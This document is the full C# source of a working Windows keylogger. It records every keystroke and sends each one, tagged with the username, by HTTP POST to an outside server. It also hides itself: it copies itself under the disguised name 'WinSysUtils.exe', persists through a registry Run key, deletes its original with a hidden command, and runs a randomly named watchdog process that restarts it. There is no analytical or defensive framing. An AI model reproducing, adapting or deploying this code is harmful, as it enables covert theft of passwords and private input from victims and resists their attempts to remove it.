using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Http;
using System.Text;
using System.Diagnostics;
using Microsoft.Win32;

namespace KeyLogger
{
    internal static class Program
    {
        private static string buf = "";
        private static readonly HttpClient client = new HttpClient();
        private static readonly string apiUrl = "https://keylogger.delphigamerz.xyz/log?username=" + Environment.UserName;

        private static string InstallDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsSystemUtility");
        private static string InstallPath = Path.Combine(InstallDir, "WinSysUtils.exe");

        private static bool[] lastKeyState = new bool[256];

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main(String[] args)
        {
            if (args.Contains("--watchdog"))
            {
                RunWatchdog();
                return;
            }

            EnsureInstalled();

            if (!IsWatchdogRunning())
            {
                StartWatchdog();
            }

            new Thread(() => {
                while (true)
                {
                    Thread.Sleep(2000);
                    
                    if (!IsWatchdogRunning())
                    {
                        StartWatchdog();
                    }
                }
            }) { IsBackground = true }.Start();

            while (true)
            {
                Thread.Sleep(10);

                bool shift = false;
                short shiftState = (short)GetAsyncKeyState(16);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;
                bool isBig = shift | caps;

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    bool isDown = (state & 0x8000) == 0x8000;

                    if (isDown && !lastKeyState[i])
                    {
                        lastKeyState[i] = true;

                        if (((Keys)i) == Keys.Space) { buf += " "; }
                        else if (((Keys)i) == Keys.Enter) { buf += "\r\n"; }
                        else if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) { }
                        else if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) { }
                        else if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) { }
                        else if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) { }
                        else if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) { }
                        else if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) { }
                        else if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) { }
                        else if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) { }
                        else if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) { }
                        else if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) { }
                        else if (((Keys)i).ToString().Length == 1)
                        {
                            char key = ((Keys)i).ToString()[0];
                            if (char.IsLetter(key) && isBig)
                            {
                                buf += char.ToUpper(key);
                            }
                            else if (char.IsLetter(key) && !isBig)
                            {
                                buf += char.ToLower(key);
                            }
                            else
                            {
                                buf += key;
                            }
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }

                        if (buf.Length > 0)
                        {
                            _ = SendPayload(buf);
                            buf = "";
                        }
                    }
                    else if (!isDown && lastKeyState[i])
                    {
                        lastKeyState[i] = false;
                    }
                }
            }
        }

        private static async Task SendPayload(string payload)
        {
            try
            {
                var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                await client.PostAsync(apiUrl, content);
            }
            catch (Exception)
            {
            }
        }

        private static void EnsureInstalled()
        {
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;

            if (!string.Equals(currentExe, InstallPath, StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    string installDirectory = Path.GetDirectoryName(InstallPath);
                    if (!Directory.Exists(installDirectory))
                    {
                        Directory.CreateDirectory(installDirectory);
                    }

                    foreach (var process in Process.GetProcesses())
                    {
                        try
                        {
                            if (process.ProcessName.Equals("WinSysUtils", StringComparison.OrdinalIgnoreCase) || 
                                process.ProcessName.Equals("KeyLogger", StringComparison.OrdinalIgnoreCase))
                            {
                                if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
                                {
                                    process.Kill();
                                    process.WaitForExit(5000);
                                }
                            }
                        }
                        catch { }
                    }

                    File.Copy(currentExe, InstallPath, true);

                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        key.SetValue("WinSysUtils", $"\"{InstallPath}\"");
                    }

                    Process.Start(InstallPath);

                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        key.SetValue("WinSysUtils", $"\"{InstallPath}\"");
                    }

                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/C choice /C Y /N /D Y /T 3 & del \"{currentExe}\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    };
                    Process.Start(psi);

                    Environment.Exit(0);
                }
                catch (Exception)
                {
                }
            }
        }
        private static void RunWatchdog()
        {
            while (true)
            {
                Thread.Sleep(1000);

                if (!IsMainProcessRunning())
                {
                    try
                    {
                        Process.Start(InstallPath);
                    }
                    catch { }
                }
            }
        }

        private static bool IsMainProcessRunning()
        {
            foreach (var process in Process.GetProcessesByName("WinSysUtils"))
            {
                try
                {
                    if (string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                catch { }
            }
            return false;
        }

        private static bool IsWatchdogRunning()
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    string name = process.ProcessName;
                    if (name.Length == 12 && name.All(char.IsDigit))
                    {
                        try
                        {
                            if (process.MainModule.FileName.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
                            {
                                return true;
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            }
            return false;
        }

        private static void StartWatchdog()
        {
            try
            {
                Random r = new Random();
                string randName = "";
                for (int i = 0; i < 12; i++) randName += r.Next(0, 10).ToString();
                
                string watchdogPath = Path.Combine(InstallDir, randName + ".exe");
                File.Copy(InstallPath, watchdogPath, true);

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = watchdogPath,
                    Arguments = "--watchdog",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
            }
            catch { }
        }
    }
}
